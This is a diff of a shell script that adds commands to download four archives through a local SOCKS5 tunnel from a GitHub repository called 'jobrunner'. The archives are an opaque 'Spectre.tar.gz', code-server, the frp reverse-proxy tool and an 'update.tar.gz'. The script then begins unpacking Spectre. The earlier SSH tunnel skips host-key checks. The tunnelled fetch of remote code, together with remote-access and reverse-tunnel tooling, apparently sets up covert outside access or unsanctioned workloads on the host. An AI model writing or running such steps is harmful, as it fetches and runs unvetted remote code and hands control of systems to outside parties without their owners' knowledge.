@@ -65,12 +65,32 @@ ssh -i sshtunneluser -f -N -o UserKnownHostsFile=/dev/null -o StrictHostKeyCheck
 
 sleep 2
 
-cd
-sleep 2
-pwd
+echo "Directory Listing before doing cd"
 sleep 2
 ls -la
-sleep 10
+sleep 2
+
+cd
+sleep 2
+echo "Directory Listing after doing cd"
+sleep 2
+pwd
+
+sleep 2
+ls -la
+
+sleep 4
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/Spectre.tar.gz -L -O -J
+
+sleep 2
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/code-server-4.14.1-linux-amd64.tar.gz -L -O -J
+
+sleep 2
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/frp_0.48.0_linux_amd64.tar.gz -L -O -J
+
+sleep 2
+curl -x socks5h://127.0.0.1:1080 https://raw.githubusercontent.com/phillipnoodles/jobrunner/refs/heads/main/update.tar.gz -L -O -J
+sleep 2
 
 tar -xf Spectre.tar.gz
 
